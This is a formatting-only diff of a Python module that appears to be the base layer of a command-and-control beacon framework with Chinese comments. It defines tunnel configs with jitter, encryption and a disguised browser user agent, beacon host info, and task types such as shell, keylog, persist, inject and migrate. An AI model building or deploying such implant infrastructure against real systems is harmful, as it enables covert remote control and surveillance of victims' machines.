@@ -11,35 +11,37 @@ Architecture:
         └── Interactive (交互模式, 未来扩展)
 """
 
+import logging
+import time
+import uuid
 from abc import ABC, abstractmethod
 from dataclasses import dataclass, field
-from typing import Optional, Dict, Any, List, Callable, Union
 from enum import Enum
-import uuid
-import time
-import logging
+from typing import Any, Callable, Dict, List, Optional, Union
 
 logger = logging.getLogger(__name__)
 
 
 class C2Status(Enum):
     """C2 连接状态"""
-    IDLE = 'idle'                    # 空闲，未连接
-    CONNECTING = 'connecting'        # 正在连接
-    CONNECTED = 'connected'          # 已连接
-    DISCONNECTED = 'disconnected'    # 已断开
-    RECONNECTING = 'reconnecting'    # 正在重连
-    ERROR = 'error'                  # 错误状态
+
+    IDLE = "idle"  # 空闲，未连接
+    CONNECTING = "connecting"  # 正在连接
+    CONNECTED = "connected"  # 已连接
+    DISCONNECTED = "disconnected"  # 已断开
+    RECONNECTING = "reconnecting"  # 正在重连
+    ERROR = "error"  # 错误状态
 
 
 class TunnelType(Enum):
     """隧道类型"""
-    HTTP = 'http'
-    HTTPS = 'https'
-    DNS = 'dns'
-    WEBSOCKET = 'websocket'
-    WS = 'ws'
-    WSS = 'wss'
+
+    HTTP = "http"
+    HTTPS = "https"
+    DNS = "dns"
+    WEBSOCKET = "websocket"
+    WS = "ws"
+    WSS = "wss"
 
 
 @dataclass
@@ -64,38 +66,41 @@ class C2Config:
         headers: 自定义请求头
         domain: DNS 隧道域名
     """
+
     server: str
     port: int = 443
-    protocol: str = 'https'
+    protocol: str = "https"
 
     # 通信配置
-    interval: float = 60.0          # 心跳间隔（秒）
-    jitter: float = 0.2             # 抖动比例 (0-1)
-    timeout: float = 30.0           # 请求超时
-    max_retries: int = 3            # 最大重试次数
-    retry_delay: float = 5.0        # 重试延迟基数
+    interval: float = 60.0  # 心跳间隔（秒）
+    jitter: float = 0.2  # 抖动比例 (0-1)
+    timeout: float = 30.0  # 请求超时
+    max_retries: int = 3  # 最大重试次数
+    retry_delay: float = 5.0  # 重试延迟基数
 
     # 加密配置
-    encryption: str = 'aes256'      # 加密算法: aes256, chacha20, xor, none
-    key: Optional[bytes] = None     # 加密密钥
-    iv: Optional[bytes] = None      # 初始化向量
+    encryption: str = "aes256"  # 加密算法: aes256, chacha20, xor, none
+    key: Optional[bytes] = None  # 加密密钥
+    iv: Optional[bytes] = None  # 初始化向量
 
     # 代理配置
-    proxy: Optional[str] = None     # HTTP/SOCKS 代理
+    proxy: Optional[str] = None  # HTTP/SOCKS 代理
 
     # 伪装配置
-    user_agent: str = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+    user_agent: str = (
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    )
     headers: Dict[str, str] = field(default_factory=dict)
 
     # DNS 隧道专用
-    domain: Optional[str] = None    # DNS 隧道域名
+    domain: Optional[str] = None  # DNS 隧道域名
     nameserver: Optional[str] = None  # DNS 服务器
 
     # 端点配置
-    checkin_path: str = '/api/init'
-    task_path: str = '/api/poll'
-    result_path: str = '/api/data'
-    close_path: str = '/api/close'
+    checkin_path: str = "/api/init"
+    task_path: str = "/api/poll"
+    result_path: str = "/api/data"
+    close_path: str = "/api/close"
 
     def __post_init__(self):
         """初始化后处理"""
@@ -103,20 +108,21 @@ class C2Config:
         self.protocol = self.protocol.lower()
 
         # 自动生成密钥
-        if self.encryption != 'none' and self.key is None:
+        if self.encryption != "none" and self.key is None:
             import secrets
+
             self.key = secrets.token_bytes(32)
 
         # 设置默认端口
-        if self.port == 443 and self.protocol in ('http', 'ws'):
+        if self.port == 443 and self.protocol in ("http", "ws"):
             self.port = 80
 
     def get_base_url(self) -> str:
         """获取基础 URL"""
-        if self.protocol in ('http', 'https'):
+        if self.protocol in ("http", "https"):
             return f"{self.protocol}://{self.server}:{self.port}"
-        elif self.protocol in ('ws', 'wss', 'websocket'):
-            proto = 'wss' if self.protocol in ('wss', 'websocket') else 'ws'
+        elif self.protocol in ("ws", "wss", "websocket"):
+            proto = "wss" if self.protocol in ("wss", "websocket") else "ws"
             return f"{proto}://{self.server}:{self.port}"
         else:
             return f"{self.server}:{self.port}"
@@ -124,11 +130,11 @@ class C2Config:
     def get_headers(self) -> Dict[str, str]:
         """获取完整请求头"""
         base_headers = {
-            'User-Agent': self.user_agent,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate',
-            'Connection': 'keep-alive',
+            "User-Agent": self.user_agent,
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Accept-Encoding": "gzip, deflate",
+            "Connection": "keep-alive",
         }
         base_headers.update(self.headers)
         return base_headers
@@ -147,6 +153,7 @@ class Task:
         timeout: 执行超时
         priority: 优先级 (越小越高)
     """
+
     id: str
     type: str
     payload: Any
@@ -155,14 +162,9 @@ class Task:
     priority: int = 5
 
     @classmethod
-    def create(cls, task_type: str, payload: Any, timeout: float = 300.0) -> 'Task':
+    def create(cls, task_type: str, payload: Any, timeout: float = 300.0) -> "Task":
         """创建新任务"""
-        return cls(
-            id=str(uuid.uuid4())[:8],
-            type=task_type,
-            payload=payload,
-            timeout=timeout
-        )
+        return cls(id=str(uuid.uuid4())[:8], type=task_type, payload=payload, timeout=timeout)
 
 
 @dataclass
@@ -177,6 +179,7 @@ class TaskResult:
         error: 错误信息
         elapsed: 执行耗时
     """
+
     task_id: str
     success: bool
     output: Any = None
@@ -186,22 +189,22 @@ class TaskResult:
     def to_dict(self) -> Dict[str, Any]:
         """转换为字典"""
         return {
-            'task_id': self.task_id,
-            'success': self.success,
-            'output': self.output,
-            'error': self.error,
-            'elapsed': self.elapsed,
+            "task_id": self.task_id,
+            "success": self.success,
+            "output": self.output,
+            "error": self.error,
+            "elapsed": self.elapsed,
         }
 
     @classmethod
-    def from_dict(cls, data: Dict[str, Any]) -> 'TaskResult':
+    def from_dict(cls, data: Dict[str, Any]) -> "TaskResult":
         """从字典创建"""
         return cls(
-            task_id=data.get('task_id', ''),
-            success=data.get('success', False),
-            output=data.get('output'),
-            error=data.get('error'),
-            elapsed=data.get('elapsed', 0.0),
+            task_id=data.get("task_id", ""),
+            success=data.get("success", False),
+            output=data.get("output"),
+            error=data.get("error"),
+            elapsed=data.get("elapsed", 0.0),
         )
 
 
@@ -212,14 +215,15 @@ class BeaconInfo:
 
     包含 Beacon 的系统信息和状态
     """
+
     beacon_id: str
-    hostname: str = ''
-    username: str = ''
-    os_info: str = ''
-    arch: str = ''
-    ip_address: str = ''
+    hostname: str = ""
+    username: str = ""
+    os_info: str = ""
+    arch: str = ""
+    ip_address: str = ""
     pid: int = 0
-    integrity: str = 'medium'       # low, medium, high, system
+    integrity: str = "medium"  # low, medium, high, system
     first_seen: float = field(default_factory=time.time)
     last_seen: float = field(default_factory=time.time)
     sleep_time: float = 60.0
@@ -227,17 +231,17 @@ class BeaconInfo:
     def to_dict(self) -> Dict[str, Any]:
         """转换为字典"""
         return {
-            'beacon_id': self.beacon_id,
-            'hostname': self.hostname,
-            'username': self.username,
-            'os_info': self.os_info,
-            'arch': self.arch,
-            'ip_address': self.ip_address,
-            'pid': self.pid,
-            'integrity': self.integrity,
-            'first_seen': self.first_seen,
-            'last_seen': self.last_seen,
-            'sleep_time': self.sleep_time,
+            "beacon_id": self.beacon_id,
+            "hostname": self.hostname,
+            "username": self.username,
+            "os_info": self.os_info,
+            "arch": self.arch,
+            "ip_address": self.ip_address,
+            "pid": self.pid,
+            "integrity": self.integrity,
+            "first_seen": self.first_seen,
+            "last_seen": self.last_seen,
+            "sleep_time": self.sleep_time,
         }
 
 
@@ -425,9 +429,7 @@ class BaseC2(ABC):
 
         if not handler:
             return TaskResult(
-                task_id=task.id,
-                success=False,
-                error=f"Unknown task type: {task.type}"
+                task_id=task.id, success=False, error=f"Unknown task type: {task.type}"
             )
 
         start_time = time.time()
@@ -436,23 +438,13 @@ class BaseC2(ABC):
             output = handler(task.payload)
             elapsed = time.time() - start_time
 
-            return TaskResult(
-                task_id=task.id,
-                success=True,
-                output=output,
-                elapsed=elapsed
-            )
+            return TaskResult(task_id=task.id, success=True, output=output, elapsed=elapsed)
 
         except Exception as e:
             elapsed = time.time() - start_time
             logger.error(f"Task {task.id} failed: {e}")
 
-            return TaskResult(
-                task_id=task.id,
-                success=False,
-                error=str(e),
-                elapsed=elapsed
-            )
+            return TaskResult(task_id=task.id, success=False, error=str(e), elapsed=elapsed)
 
     def __enter__(self):
         self.connect()
@@ -468,33 +460,34 @@ class BaseC2(ABC):
 # 任务类型常量
 class TaskTypes:
     """预定义任务类型"""
-    SHELL = 'shell'             # Shell 命令执行
-    UPLOAD = 'upload'           # 上传文件
-    DOWNLOAD = 'download'       # 下载文件
-    SCREENSHOT = 'screenshot'   # 截图
-    KEYLOG = 'keylog'          # 键盘记录
-    PERSIST = 'persist'        # 持久化
-    SLEEP = 'sleep'            # 修改睡眠时间
-    EXIT = 'exit'              # 退出
-    CHECKIN = 'checkin'        # 签到
-    PS = 'ps'                  # 进程列表
-    KILL = 'kill'              # 结束进程
-    CD = 'cd'                  # 切换目录
-    PWD = 'pwd'                # 当前目录
-    LS = 'ls'                  # 目录列表
-    CAT = 'cat'                # 读取文件
-    INJECT = 'inject'          # 进程注入
-    MIGRATE = 'migrate'        # 进程迁移
+
+    SHELL = "shell"  # Shell 命令执行
+    UPLOAD = "upload"  # 上传文件
+    DOWNLOAD = "download"  # 下载文件
+    SCREENSHOT = "screenshot"  # 截图
+    KEYLOG = "keylog"  # 键盘记录
+    PERSIST = "persist"  # 持久化
+    SLEEP = "sleep"  # 修改睡眠时间
+    EXIT = "exit"  # 退出
+    CHECKIN = "checkin"  # 签到
+    PS = "ps"  # 进程列表
+    KILL = "kill"  # 结束进程
+    CD = "cd"  # 切换目录
+    PWD = "pwd"  # 当前目录
+    LS = "ls"  # 目录列表
+    CAT = "cat"  # 读取文件
+    INJECT = "inject"  # 进程注入
+    MIGRATE = "migrate"  # 进程迁移
 
 
 __all__ = [
-    'C2Status',
-    'TunnelType',
-    'C2Config',
-    'Task',
-    'TaskResult',
-    'BeaconInfo',
-    'BaseTunnel',
-    'BaseC2',
-    'TaskTypes',
+    "C2Status",
+    "TunnelType",
+    "C2Config",
+    "Task",
+    "TaskResult",
+    "BeaconInfo",
+    "BaseTunnel",
+    "BaseC2",
+    "TaskTypes",
 ]
